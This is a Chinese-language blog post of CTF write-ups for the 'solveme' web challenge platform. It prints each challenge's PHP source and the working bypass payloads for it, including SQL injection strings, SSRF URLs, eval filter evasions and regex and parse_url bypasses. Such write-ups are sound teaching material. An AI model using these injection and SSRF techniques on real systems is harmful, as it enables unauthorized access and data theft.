---
title: solveme
date: 2018-03-18 18:33:16
categories: Blog
thumbnail: "https://s1.ax1x.com/2018/03/21/97oklR.png"
---

一个风格很棒哒平台诶嘿嘿~直接给源码就很苏糊。。虽然给了难的依旧难23333

### Warm up

Are you ready for solve the problems?

```php
<?php
    error_reporting(0);
    require DIR.'/lib.php';
    echo base64_encode(hex2bin(strrev(bin2hex($flag)))), '<hr>';
    highlight_file(FILE);
```

用py写不来QAQ

只能用PHP惹`echo hex2bin(strrev(bin2hex(base64_decode('1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY='))));`

py哒wp：

```python
import base64

ciphertext = "1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY="
plaintext = base64.b64decode(ciphertext.encode())
plaintext = "".join(["%02X" % x for x in plaintext])
plaintext = plaintext[::-1]
plaintext = "".join([chr(int(plaintext[x:x+2], 16)) for x in range(0, len(plaintext), 2)])

print(plaintext)
```

### Bad compare

Why is it wrong answer?

```php
<?php
    error_reporting(0);
    require __DIR__.'/lib.php';
    if(isset($_GET['answer'])){
        if($_GET['answer'] === 'роВхУъесЧМ'){
            echo $flag;
        }else{
            echo 'Wrong answer';
        }
        echo '<hr>';
    }
    highlight_file(__FILE__);
```

真的是糟糕的比较啊。。一看就是编码要搞一搞唔。。然而不叽到用啥吖。。。

第一下用惹py抓取，发现是？？？？然后拿过去请求就报错惹QAQ继续用撒乎乎的PHP

```php
<?php
$url = 'http://badcompare.solveme.peng.kr';
//初始化一个 cURL 对象 
$ch  = curl_init();
//设置你需要抓取的URL
curl_setopt($ch, CURLOPT_URL, $url);
// 设置cURL 参数，要求结果保存到字符串中还是输出到屏幕上。
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//是否获得跳转后的页面
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$data = curl_exec($ch);
curl_close($ch);
echo $data;
$a=substr($data, 917, 10);
print $a;
$urll=$url.'/?answer='.$a;
print $urll;
$ch  = curl_init();
curl_setopt($ch, CURLOPT_URL, $urll);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$data = curl_exec($ch);
curl_close($ch);
echo $data;
?>
```

emmm没错就是百度上如何使用PHP curl获取页面这个问题下粘过来改改的ORZ

然后有搜到另外的payload是这样哒 `http://badcompare.solveme.peng.kr/?answer=%F0%EE%C2%F5%D3%FA%E5%F1%D7%CC`

果然是编码嘤嘤嘤，可以用 `urllib.quote(s.content[917:927])` 得到~

### Winter sleep

I'm so sleepy. zzz

冬眠！窝也想！！！（瘫。。。

```php
<?php
    error_reporting(0);
    require __DIR__.'/lib.php';
    if(isset($_GET['time'])){
        if(!is_numeric($_GET['time'])){
            echo 'The time must be number.';
        }else if($_GET['time'] < 60 * 60 * 24 * 30 * 2){
            echo 'This time is too short.';
        }else if($_GET['time'] > 60 * 60 * 24 * 30 * 3){
            echo 'This time is too long.';
        }else{
            sleep((int)$_GET['time']);
            echo $flag;
        }
        echo '<hr>';
    }
    highlight_file(__FILE__);
```

写了个中间的数，然后等吖等，，等了半天才意识到除以3600还是一个很大的数。。。orzzzzz

然后用十六进制试。。。不行

然后用科学计数法6e几试出来的。。

### Hard login

When do you give me the flag? When the login succeeds?

```php
<?php
    error_reporting(0);
    session_start();
    require __DIR__.'/lib.php';
    if(isset($_GET['username'], $_GET['password'])){

        if(isset($_SESSION['hard_login_check'])){
            echo 'Already logged in..';
        }else if(!isset($_GET['username']{3}) || strtolower($_GET['username']) != $hidden_username){
            echo 'Wrong username..';
        }else if(!isset($_GET['password']{7}) || $_GET['password'] != $hidden_password){
            echo 'Wrong password..';
        }else{
            $_SESSION['hard_login_check'] = true;
            echo 'Login success!';
            header('Location: ./');
        }
        echo '<hr>';
    }
    highlight_file(__FILE__);
```



嗨呀好坑吖，，虽然第一下想过直接看看./的。。。但是转念一想这不是代码审计嘛。。坑定是找骚操作绕过吧

然后{3}这个貌似是第三个字符不能为空，试了半天取$hidden_username的地址之类的。。本地发现这样不行啊

emmmmm最后直接访问/或者加上index.php抓包。。。302直接一大个flag。。日了喵了（curl也直接可以看到x

### URL filtering

If you want to have a flag, please answer from the URL.

```php
<?php
    error_reporting(0);
    require __DIR__."/lib.php";
    $url = urldecode($_SERVER['REQUEST_URI']);
    $url_query = parse_url($url, PHP_URL_QUERY);
    $params = explode("&", $url_query);
    foreach($params as $param){
        $idx_equal = strpos($param, "=");
        if($idx_equal === false){
            $key = $param;
            $value = "";
        }else{
            $key = substr($param, 0, $idx_equal);
            $value = substr($param, $idx_equal + 1);
        }
        if(strpos($key, "do_you_want_flag") !== false || strpos($value, "yes") !== false){
            die("no hack");
        }
    }
    if(isset($_GET['do_you_want_flag']) && $_GET['do_you_want_flag'] == "yes"){
        die($flag);
    }
    highlight_file(__FILE__);
```

一直在本地各种试。。然后老年人记性终于想起那个parse_url()的漏洞结果忘了这是只存在于php5.4.7以前

最后加两个斜杠出flag

qaqqqqqqqqqqqqqqqq

结果wp是另一种骚操作。。orzzzzzzz

`?foo%23&do_you_want_flag=yes` 结果是foo->空，后面应该是注释掉惹，$url_query只剩下foo，但的确get到了do_you_want_flag，妙吖.jpg

### Hash collision

We had better be prepared for collisions, because two distinct keys will occasionally hash to the same value.

```php
<?php
    error_reporting(0);
    require __DIR__.'/lib.php';
    if(isset($_GET['foo'], $_GET['bar'])){
        if(strlen($_GET['foo']) > 30 || strlen($_GET['bar']) > 30){
            die('Too long');
        }
        if($_GET['foo'] === $_GET['bar']){
            die('Same value');
        }
        if(hash('sha512', $_GET['foo']) !== hash('sha512', $_GET['bar'])){
            die('Different hash');
        }
        echo $flag, '<hr>';
    }
    highlight_file(__FILE__);
```

数组绕过。一秒粗flag。那句话怎么说来着、、随着身体一阵颤抖突然觉得索然无味？（什么鬼x

### Array2String

```
<?php
    error_reporting(0);
    require __DIR__.'/lib.php';

    $value = $_GET['value'];

    $username = $_GET['username'];
    $password = $_GET['password'];

    for ($i = 0; $i < count($value); ++$i) {
        if ($_GET['username']) unset($username);
        if ($value[$i] > 32 && $value[$i] < 127) unset($value);
        else $username .= chr($value[$i]);

        if ($username == '15th_HackingCamp' && md5($password) == md5(file_get_contents('./secret.passwd'))) {
            echo 'Hello '.$username.'!', '<br>', PHP_EOL;
            echo $flag, '<hr>';
        }
    }

    highlight_file(__FILE__);
```

./secret.passwd得到password=simple_passw0rd

然后直接传username会被unset，value要是在32-127的可见字符中也要unset

看PHP手册里的chr(),第一个栗子就嗦

Note that if the number is higher than 256, it will return the number mod 256.
For example :
chr(321)=A because A=65(256)

然后就很容易啦，每个加256~

另外那种加好多小数点加上几e几的也可以~

```
http://array2string.solveme.peng.kr/?value[0]=305&value[1]=309&value[2]=372&value[3]=360&value[4]=351&value[5]=328&value[6]=353&value[7]=355&value[8]=363&value[9]=361&value[10]=366&value[11]=359&value[12]=323&value[13]=353&value[14]=365&value[15]=368&password=simple_passw0rd
```

好像数组只能这样一个一个传？恩x

### Give me a link

I want link of local server.

```
<?php
    error_reporting(0);
    require __DIR__.'/lib.php';

    if(isset($_GET['url'])){
        $url = $_GET['url'];

        if(preg_match('/_|\s|\0/', $url)){
            die('Not allowed character');     //url里不能有下划线
        }

        if(!preg_match('/^https?\:\/\/'.$_SERVER['HTTP_HOST'].'/i', $url)){
            die('Not allowed URL');           //url要匹配Host:http://givemealink.solveme.peng.kr
        }

        $parse = parse_url($url);             //parse_url解析 URL，返回其组成部分
        if($parse['path'] !== '/plz_give_me'){
            die('Not allowed path');
        }

        $ch = curl_init();                    //向解析出的$parse['host']地址curl发送flag
        curl_setopt($ch, CURLOPT_URL, $parse['scheme'].'://'.$parse['host'].'/'.$flag);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);

        echo 'Okay, I sent the flag.', '<hr>';
    }

    highlight_file(__FILE__);
```

补一发请求头里的host，明明上次看视频刚刚记过。。又忘了QAQ

- 多个域名放在同一台主机上时，通过不同的Host可以区分出我是访问这个虚拟机上的哪个站点

Example #1 parse_url() 栗子：

`<?php$url = 'http://username:password@hostname/path?arg=value#anchor';print_r(parse_url($url));echo parse_url($url, PHP_URL_PATH);?>`

以上例程会输出：

```
Array
(
    [scheme] => http
    [host] => hostname
    [user] => username
    [pass] => password
    [path] => /path
    [query] => arg=value
    [fragment] => anchor
)
```

所以把我们哒host放@后面就好啦

po个图嘿嘿嘿![9OzPQ1.png](https://s1.ax1x.com/2018/03/27/9OzPQ1.png)

这儿有个问题，窝第一下带了个端口然后监听那个端口是get不到的，想了想应该是它的get请求就得用80端口才能收到（大概x

哦哦下划线的过滤用%10啊%1a啊这种linux认不得的字符它就会寄几转成下划线啦~

（更正：不是linux转的。。又是这个parse_url()的漏洞:The URL to parse. Invalid characters are replaced by _.

（补充：第一下窝也是想看log来着。。不叽到在哪啊。。（丢人x。。所以就监听着惹。。（捂脸x

所以似/var/log/目录下面，用`grep flag *`进行查找

### Give me a link 2

I want link of local server.

```
<?php
    error_reporting(0);
    require __DIR__.'/lib.php';

    if(isset($_GET['url'])){
        $url = $_GET['url'];

        if(preg_match('/_|\s|\0/', $url)){
            die('Not allowed character');
        }

        $parse = parse_url($url);
        if(!preg_match('/^https?$/i', $parse['scheme'])){
            die('Not allowed scheme');
        }

        if(!preg_match('/^(localhost|127\.\d+\.\d+\.\d+|[^.]+)(\:\d+)?$/i', $parse['host'])){
            die('Not allowed host');
        }

        if(!preg_match('/\/plz_give_me$/', $parse['path'])){
            die('Not allowed path');
        }

        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        if($socket === false){
            die('Failed to create socket');
        }

        $host = gethostbyname($parse['host']);
        $port = is_null($parse['port']) ? 80 : $parse['port'];

        if(socket_connect($socket, $host, $port) === false){
            die('Failed to connect');
        }

        $send = "HEAD /".$flag." HTTP/1.1\r\n".
            "Host: ".$host.":".$port."\r\n".
            "Connection: Close\r\n".
            "\r\n\r\n";
        socket_write($socket, $send, strlen($send));

        $recv = socket_read($socket, 1024);var_dump($recv);
        if(!preg_match('/^HTTP\/1.1 200 OK\r\n/', $recv)){
            die('Not allowed response');
        }

        socket_close($socket);

        echo 'Okay, I sent the flag.', '<hr>';
    }

    highlight_file(__FILE__);
```

加了个匹配

`preg_match('/^(localhost|127\.\d+\.\d+\.\d+|[^.]+)(\:\d+)?$/i', $parse['host'])`

注意到中间有个或任何数字，所以把IP转成大整数就和上题一样啦

有网站在线转也有PHP的一个函数ip2long()

### Replacefilter

Do not tell me to give the flag.

```
<?php
    error_reporting(0);
    require __DIR__.'/lib.php';

    if(isset($_GET['say']) && strlen($_GET['say']) < 20){

        $say = preg_replace('/^(.*)flag(.*)$/', '${1}<!-- filtered -->${2}', $_GET['say']);

        if(preg_match('/give_me_the_flag/', $say)){
            echo $flag;
        }else{
            echo 'What the f**k?';
        }

        echo '<hr>';
    }

    highlight_file(__FILE__);
```

看到preg_replace第一反应双写绕过。。然鹅刚好长度20。。

用%0a换行符绕过匹配（^ $必须在同一行的匹配~

### Hell JS

I created art with javascript.

WTF...不管在哪个网站解。。都是弹窗。。喵喵喵？

然后继续撒夫夫地搜”jsfuck在线解“居然第三个答案就是这题wp！惊了！一直以为这个网站米有wp存在的。。。

然后学到两个姿势

1. `eval => []["filter"]["constructor"]( CODE )()  //翻译格式`

2. sublime里Ctrl+Shift+Space就可以选中所在的括号及对应括号间的区域~

然后选到第二段炒鸡长的放控制台就有啦

```
// good job!

let flag = prompt("what is the flag?");

if (flag === "") {

	alert("plz input");

} else if (flag === "flag{21df4ad3ce31af845cf9cd6a5eddbb91}") {

	alert("bingo");

} else {

	alert("wrong");

}"
```

（补充：卧槽。。方方土学长的另一种骚操作：

```
#!/usr/bin/python
# coding: utf-8

js = "......" #此处省去源码

alpha_dict = {
	'"f"': '(![]+[])[+[]]',
	'"i"': '([][[]]+[])[!![]+!![]+!![]+!![]+!![]]',
	'"l"': '(![]+[])[!![]+!![]]',
	'"t"': '(!![]+[])[+[]]',
	'"e"': '(!![]+[])[!![]+!![]+!![]]',
	'"r"': '(!![]+[])[+!![]]',
	'"c"': '({}+[])[!![]+!![]+!![]+!![]+!![]]',
	'"o"': '({}+[])[+!![]]',
	'"n"': '([][[]]+[])[+!![]]',
	'"s"': '(![]+[])[!![]+!![]+!![]]',
	'"u"': '(!![]+[])[!![]+!![]]',
	'" "': '({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]',
	'"b"': '({}+[])[!![]+!![]]',
	'" "': '({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]',
	'"a"': '(![]+[])[+!![]]',
	'"2"': '(!![]+!![]+[])',
	'"4"': '(!![]+!![]+!![]+!![]+[])',
	'"7"': '(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])',
	'"y"': '(+(+!![]+"e"+(+!![])+(+[])+(+[])+(+[]))+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]',
	'"0"': '(+[]+[])',
	'"3"': '(!![]+!![]+!![]+[])',
	'"5"': '(!![]+!![]+!![]+!![]+!![]+[])',
	'"1"': '(+!![]+[])',
	'"9"': '(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])',
	'"8"': '(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])',
	'"6"': '(!![]+!![]+!![]+!![]+!![]+!![]+[])',
	'"y"': '(+(+!![]+(!![]+[])[!![]+!![]+!![]]+(+!![])+(+[])+(+[])+(+[]))+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]',
	'"d"': '([][[]]+[])[!![]+!![]]',
	'[3]': '[!![]+!![]+!![]]'
}

for key, value in alpha_dict.items():
	js = js.replace(value, key)

clean_dict = {
	'"p"': '([]["filter"]["constructor"]("return "+"location")()+[])[3]',
	'"constructor"': '"c"+"o"+"n"+"s"+"t"+"r"+"u"+"c"+"t"+"o"+"r"',
	'"return "': '"r"+"e"+"t"+"u"+"r"+"n"+" "',
	'"filter"': '"f"+"i"+"l"+"t"+"e"+"r"',
	'"fontcolor"': '"f"+"o"+"n"+"t"+"c"+"o"+"l"+"o"+"r"',
	'"location"': '"l"+"o"+"c"+"a"+"t"+"i"+"o"+"n"',
	'"110"': '"1"+"2"+"2","3"+"2","1"+"0"+"5","1"+"1"+"0"',
	'"111"': '"1"+"1"+"1"',
	'"99"': '"9"+"9"',
	'"98"': '"9"+"8"',
	'"57"': '"5"+"7"',
	'"101"': '"1"+"0"+"1"',
	'"108"': '"1"+"0"+"8"',
	'"106"': '"1"+"0"+"6"',
	'"61"': '"6"+"1"',
	'"112"': '"1"+"1"+"2"',
	'"116"': '"1"+"1"+"6"',
	'"40"': '"4"+"0"',
	'"34"': '"3"+"4"',
	'"119"': '"1"+"1"+"9"',
	'"105"': '"1"+"0"+"5"',
	'"102"': '"1"+"0"+"2"',
	'"125"': '"1"+"2"+"5"',
	'"102"': '"1"+"0"+"2"',
	'"97"': '"9"+"7"',
	'"100"': '"1"+"0"+"0"',
# 	# '"u"': '("1"["s"+"u"+"b"]())[!![]+!![]]'
}

for key, value in clean_dict.items():
	js = js.replace(value, key)

print js
```

然后有好多数字字符加来加去。。整理后再用String.fromCharCode()转成字符就是解粗来那个惹orzzzzzzzzzz不愧是方方土

然后那个网站里大佬的wp全是嘲讽。。

> just open another webpage in chrome, and open the development tool , choose the source tab, active the pause button, execute the jsfuck
> encoded code, and step into next function call, then you can find the compare code , and the flag...that's easy, maybe it should be 160pt instead of 260pt...

哦。666666666666。扣唉扣。

### Anti SQLi

I really hate SQL injection.

```
<?php
    // It's 'Anti SQLi' problem of 'Solve Me'.
    error_reporting(0);
    require __DIR__.'/lib.php'; 

    $id = $_GET['id'];
    $pw = $_GET['pw'];

    if(isset($id, $pw)){
        preg_match(
            '/\.|\`|"|\'|\\|\xA0|\x0B|0x0C|\t|\r|\n|\0|'.
            '=|<|>|\(|\)|@@|\|\||&&|#|\/\*.*\*\/|--[\s\xA0]|'.
            '0x[0-9a-f]+|0b[01]+|x\'[0-9a-f]+\'|b\'[01]+\'|'.
            '[\s\xA0\'"]+(as|or|and|r*like|regexp)[\s\xA0\'"]+|'.
            'union[\s\xA0]+select|[\s\xA0](where|having)|'.
            '[\s\xA0](group|order)[\s\xA0]+by|limit[\s\xA0]+\d|'.
            'information_schema|procedure\s+analyse\s*/is',
            $id.','.$pw
        ) and die('Hack detected');

        $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)
            or die('SQL server down');

        $result = mysqli_fetch_array(
            mysqli_query(
                $con, 
                "SELECT * FROM `antisqli` WHERE `id`='{$id}' AND `pw`=md5('{$pw}');"
            )
        );
        mysqli_close($con);

        if(isset($result)){
            if($result['no'] === '31337'){
                echo $flag;
            }else{
                echo 'Hello, ', $result['id'];
            }
        }else{
            echo 'Login failed';
        }
        echo '<hr>';
    }

    highlight_file(__FILE__);
```

第一反应union-》union select被过滤-》用union all select 绕过

单引号被过滤-》没法闭合-》注释符#和--加任意字符也被过滤-》用--%1a注释

用正则过滤反斜杠正确姿势是四个反斜杠(第一个斜杠转义了第二个，第三个转义了第四个，最终就是 “\\”，正则表达式里转互相转义一下就是 “\”了)-》可以用反斜杠转义掉$id后面的单引号-》

```
SELECT * FROM `antisqli` WHERE `id`='\' AND `pw`=md5('{$pw}');
```

```
\' AND `pw`=md5( //这一整个变成字符串里的了
```

最后试出三列

`id=\&pw=union all select 31337,31337,31337 from antisqli --%1a`

###  Namecheck

What's your name?

```
<?php
    error_reporting(0);
    require __DIR__.'/lib.php'; 

    if(isset($_GET['name'])){

        $name = $_GET['name'];
        if(preg_match("/admin|--|;|\(\)|\/\*|\\0/i", $name)){
            echo 'Not allowed input';
            goto quit;
        }

        $sql = new SQLite3('name_check.db', SQLITE3_OPEN_READWRITE);
        $res = $sql->query("
            SELECT 
            MAX('0','1','{$name}') LIKE 'a%',        //以a开头
            INSTR('{$name}','d')>0,                  //包含d
            MIN('{$name}','b','c') LIKE '__m__',     //中间为m
            SUBSTR('{$name}',-2)='in'                //最后两个是in
        ;");
        if($res === false){
            echo 'Database error';
            goto quit;
        }

        $row = $res->fetchArray(SQLITE3_NUM);
        if(
            $row[0] + $row[1] + $row[2] + $row[3] !== 4 ||
            array_sum($row) !== 4                    //四条都满足
        ){
            echo 'Auth failed';
            goto quit;
        }

        echo $flag;

    quit:
        echo '<hr>';
    }

    highlight_file(__FILE__);
```

SQLite连接符：||

所以name=adm'||'in

### I am slowly

I am very slow because I often sleep.

```
<?php
    // It's 'I am slowly' problem of 'Solve Me'.
    error_reporting(0);
    require __DIR__.'/lib.php'; 

    $table = 'iamslowly_'.ip2long($_SERVER['REMOTE_ADDR']);
    $answer = $_GET['answer'];

    if(isset($answer)){
        $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)
            or die('SQL server down');

        $result = mysqli_fetch_array(
            mysqli_query($con, "SELECT `count` FROM `{$table}`;")
        );
        if(!isset($result)){
            mysqli_query($con, "CREATE TABLE IF NOT EXISTS `{$table}` (`answer` char(32) NOT NULL, `count` int(4) NOT NULL);");
            $new_answer = md5(sha1('iamslowly_'.mt_rand().'_'.mt_rand().'_'.mt_rand()));
            mysqli_query($con, "INSERT INTO `{$table}` (`answer`,`count`) VALUES ('{$new_answer}',1);");

        }elseif($result['count'] === '12'){
            mysqli_query($con, "DROP TABLE `{$table}`;");
            echo 'Game over';
            goto quit;
        }

        $randtime = mt_rand(1, 10);
        $result = mysqli_fetch_array(
            mysqli_query($con, "SELECT * FROM `{$table}` WHERE sleep({$randtime}) OR `answer`='{$answer}';")
        );
        if(isset($result) && $result['answer'] === $answer){
            mysqli_query($con, "DROP TABLE `{$table}`;");
            echo $flag;
        }else{
            mysqli_query($con, "UPDATE `{$table}` SET `count`=`count`+1;");
            echo 'Go fast';
        }

quit:
        mysqli_close($con);
        echo '<hr>';
    }

    highlight_file(__FILE__);
```

很想po表情包。。fine，anyway，peace&love（微笑。。。人间不值得啊。。

跑了一整天的脚本，，每次不一样也就算了，还每一次都错QAQ

思路就是在第十一次的时候让它睡久一点，第十二次判断了之后十一次才进行到加一就可以绕过count=12时drop表的判断了，有点条件竞争的意思

然后再在answer处时间盲注。。也只有这儿能注2333。。。然后。。坑

跑到最后它已经是aaaaaaaaaa了，，发个请求就回应几个字符，过了半天又多几个。。。难道站被日坏了吗。。

就酱。跑不粗就跑不粗呗。阿弥陀佛。人间不值得.jpg。

### Check via eval

```
<?php
    error_reporting(0);
    require __DIR__.'/lib.php';

    $exam = 'return\''.sha1(time()).'\';';

    if (!isset($_GET['flag'])) {
        echo '<a href="./?flag='.$exam.'">Click here</a>';
    }
    else if (strlen($_GET['flag']) != strlen($exam)) {         //flag长度需要是49
        echo 'Not allowed length';
    }
    else if (preg_match('/`|"|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit/is', $_GET['flag'])) {
        echo 'Not allowed keyword';
    }
    else if (eval($_GET['flag']) === sha1($flag)) {
        echo $flag;
    }
    else {
        echo 'What\'s going on?';
    }

    echo '<hr>';

    highlight_file(__FILE__);
```

很简单的源码==大道至简啊

只要`eval($_GET['flag']) === sha1($flag)` 就可以得到flag~

先尝试构造 `?flag=$a=%27fl%27;$b=%27ag%27;return%20sha1(${$a.$b});1111111111;` ，才发现括号被过滤惹

那咋办咧，看一看eval函数

> eval() 返回 NULL，除非在执行的代码中 return 了一个值，函数返回传递给 return 的值。
>
> 代码不能包含打开/关闭 PHP tags。比如， 'echo "Hi!";' 不能这样传入： '<?php echo "Hi!"; ?>'。但仍然可以用合适的 PHP tag 来离开、重新进入 PHP 模式。比如 'echo "In PHP mode!"; ?>In HTML mode!<?php echo "Back in PHP mode!";'。
>
> 除此之外，传入的必须是有效的 PHP 代码。所有的语句必须以分号结尾。比如 'echo "Hi!"' 会导致一个 parse error，而 'echo "Hi!";' 则会正常运行。
>
> return 语句会立即中止当前字符串的执行。
>
> 代码执行的作用域是调用 eval() 处的作用域。因此，eval() 里任何的变量定义、修改，都会在函数结束后被保留。

没办法等于，于是尝试用eval直接输出，然鹅输出的函数都过滤惹

想到`<?php echo $a; ?>` 有个简写版： `<?=$a;?>`

于是构造
```
111111111111111111111111111111?><?=${%27fl%27.%27ag%27}?>
```

woc？？.也被过滤惹

emmmm`?flag=$a=%27flaa%27;$a{3}=%27g%27;1111111111111111111?><?=$$a?>` 这样~

！鸡冻

### Cheap Lottery

首先终于发现一个不是直接给源码的题，当然是玩一发啦~然而等60s真的是烦==（本来就不是让你玩的辣！

发现三种不同的返回。。就没一次对惹一个的嘛！（满脸非气QAQ

在robots.txt发现/backup/

ini.sql:

![CpDHD1.png](https://s1.ax1x.com/2018/04/03/CpDHD1.png)

其中注意到ENGINE=InnoDB DEFAULT CHARSET=utf8;不叽到是不是故意强调的~

index.php:

```
<?php
	require __DIR__."/_config.php";
	$sql = new mysqli($sql_host, $sql_username, $sql_password, $sql_dbname) or die("SQL Server Down T.T");

	$name = "guest_".$_SERVER['REMOTE_ADDR'];
	$result = $sql->query("SELECT * FROM `lottery` WHERE `name`='{$name}';");
	$row_guest = $result->fetch_assoc();
	unset($name, $result);

	if(isset($_GET['lottery']) && is_array($_GET['lottery']) && count($_GET['lottery']) == 5){ // buy request

		if(isset($row_guest)){ // already bought

			$msg = "You already bought a lottery ticket at ".date('Y-m-d H:i:s', $row_guest['time']).".";
			$buy_enable = false;

		}else{ // not bought yet, but buy now

			// insert real answer
			$name = "admin_".$_SERVER['REMOTE_ADDR'];
			$time = time();
			$nums = implode(",", [ mt_rand(1, 100), mt_rand(1, 100), mt_rand(1, 100), mt_rand(1, 100), mt_rand(1, 100) ]);
			$sql->query("INSERT INTO `lottery`(`name`, `time`, `nums`) VALUE('{$name}', '{$time}', '{$nums}');");
			unset($name, $time, $nums);

			// insert my answer
			$name = "guest_".$_SERVER['REMOTE_ADDR'];
			$time = time();

			$url_query = urldecode(parse_url($_SERVER['REQUEST_URI'], PHP_URL_QUERY));
			$nums = preg_replace("/[a-zA-Z\[\]\=]/", "", $url_query);
			$nums = strtr($nums, "&", ",");
			$sql->query("INSERT INTO `lottery`(`name`, `time`, `nums`) VALUE('{$name}', '{$time}', '{$nums}');");
			unset($name, $time, $url_query, $nums);

			$msg = "You bought a lottery ticket. Please wait 60 sec.";
			$buy_enable = false;
		}

	}else{ // not buy request

		if(isset($row_guest)){ // already bought

			if(intval($row_guest['time']) + 60 <= time()){ // publish result

				$name = "admin_".$_SERVER['REMOTE_ADDR'];
				$result = $sql->query("SELECT * FROM `lottery` WHERE `name`='{$name}';");
				$row_admin = $result->fetch_assoc();
				unset($name, $result);

				// check answer
				$bingo = 0;
				$nums_admin = explode(",", $row_admin['nums']); // admin_*
				$nums_guest = explode(",", $row_guest['nums']); // guest_*
				for($i = 0; $i < 5; ++$i){
					for($k = 0; $k < 5; ++$k){
						if(isset($nums_admin[$i], $nums_guest[$k]) && $nums_admin[$i] === $nums_guest[$k]){
							++$bingo;
							unset($nums_guest[$k]);
							break;
						}
					}
				}
				unset($nums_admin, $nums_guest);

				if($bingo == 5){ // correct all
					$msg = "Perfect! The flag is <code>{$flag}</code>.";

				}elseif($bingo > 0){ // correct
					$msg = "Excellent! You matched {$bingo} numbers. :)";

				}else{ // incorrect
					$msg = "Oops! You did not even match one. :(";

				} 
				$buy_enable = true;

				$name_admin = "admin_".$_SERVER['REMOTE_ADDR'];
				$name_guest = "guest_".$_SERVER['REMOTE_ADDR'];
				$sql->query("DELETE FROM `lottery` WHERE `name` IN ('{$name_admin}', '{$name_guest}');");
				unset($name, $name_admin, $name_guest);

			}else{

				$msg = "Please wait until at ".date('Y-m-d H:i:s', intval($row_guest['time']) + 60).".";
				$buy_enable = false;
			}

		}else{ // not bought

			$msg = "Oh, Please buy a lottery ticket. It's free!";
			$buy_enable = true;
		}
	}
?>
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
		<link rel="icon" href="/assets/coin.png">
		<title>Cheap Lottery</title>
		<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Josefin+Sans">
		<link rel="stylesheet" href="/assets/styles.css">
	</head>
	<body>
		<div class="container-fluid">
			<div class="row">
				<div class="col-md-offset-2 col-md-8">
					<header class="page-header">
						<h1>
							<p><a class="no-deco" href="/"><img src="/assets/coin.png" style="vertical-align: bottom;"> Cheap Lottery</a></p>
							<small>We'll give you the flag, if you win a chance of 1 in 10,000,000,000!</small>
						</h1>
					</header>
				</div>
			</div>
			<div class="row">
				<div class="col-md-offset-2 col-md-8">
					<form method="GET">
<?php
	for($k = 0; $k < 5; ++$k){
		$title = ['A', 'B', 'C', 'D', 'E'][$k];

		echo '<div class="lottery-box">'.PHP_EOL;
		echo '	<h2>'.$title.'</h2>'.PHP_EOL;
		for($i = 1; $i <= 100; ++$i){
			echo '	<div class="radio-box">'.PHP_EOL;
			echo '		<label class="radio-inline"><input type="radio" name="lottery['.$title.']" value="'.$i.'">'.$i.'</label>'.PHP_EOL;
			echo '	</div>'.PHP_EOL;
		}
		echo '</div>'.PHP_EOL;

		unset($title);
	}
?>
						<div class="clearfix"></div>
						<div class="text-center" style="margin-top: 2.5em;">
							<button type="submit" class="btn btn-success btn-lg"<?php if(!$buy_enable) echo " disabled"; ?>>Buy Ticket</button>
						</div>
					</form>
				</div>
			</div>
			<div class="row">
				<div class="col-md-offset-3 col-md-6">
					<hr>
					<div class="well text-center">
						<?php echo $msg; ?>
					</div>
				</div>
			</div>
			<div class="row">
				<div class="col-md-offset-2 col-md-8">
					<hr>
					<footer class="text-right">
						<p class="text-muted">&copy; <a class="text-muted" href="//safflower.kr" target="_blank">Safflower</a>. All Rights Reserved.</p>
					</footer>
				</div>
			</div>
		</div>
	</body>
</html>
```

数据库结构：

name|time|nums

admin_ip|time()|random_a,b,c,d,e

guest_ip|time()|get_A,B,C,D,E

index逻辑：

![CpBkLt.png](https://s1.ax1x.com/2018/04/03/CpBkLt.png)

看注入处过滤：

```
$nums = preg_replace("/[a-zA-Z[]=]/", "", $url_query);
```

字母全不行，但是没过滤任何符号

先看要怎么注：

```
INSERT INTO lottery(name, time, nums) VALUE('{$name}', '{$time}', '{$nums}');
```

$nums是传入的

```
INSERT INTO lottery(name, time, nums) VALUE('{$name}', '{$time}', '1'),('admin_ip"','time()','1,1,1,1,1'),('guest_ip','time()','1,1,1,1,1')#');
```

这样使我们注入的IP再不带参数地访问时就可以匹配惹

然后。这里面唯十个字母咋办呢。

果断是找编码代替：无字母且SQL能识别

悄咪咪看wp~有这样一个[神奇的网站](http://collation-charts.org/mysql60/mysql604.utf8_general_ci.european.html)

最后payload

```http://cheaplottery.solveme.peng.kr/index.php?lottery%5BA%5D=1'),('%C3%A0%C4%8F%E1%B9%81%C3%8D%C3%B1_192.34.62.236','1522763149','1,1,1,1,1'),('%C4%9D%C3%9B%C3%A8%C5%9B%C5%A3_192.34.62.236','1522763149','1,1,1,1,1')%23&lottery%5BB%5D=&lottery%5BC%5D=&lottery%5BD%5D=&lottery%5BE%5D=```

url解码粗来是这样滴

``http://cheaplottery.solveme.peng.kr/index.php?lottery[A]=1'),('àďṁÍñ_192.34.62.236','1522763149','1,1,1,1,1'),('ĝÛèśţ_192.34.62.236','1522763149','1,1,1,1,1')#&lottery[B]=&lottery[C]=&lottery[D]=&lottery[E]=``

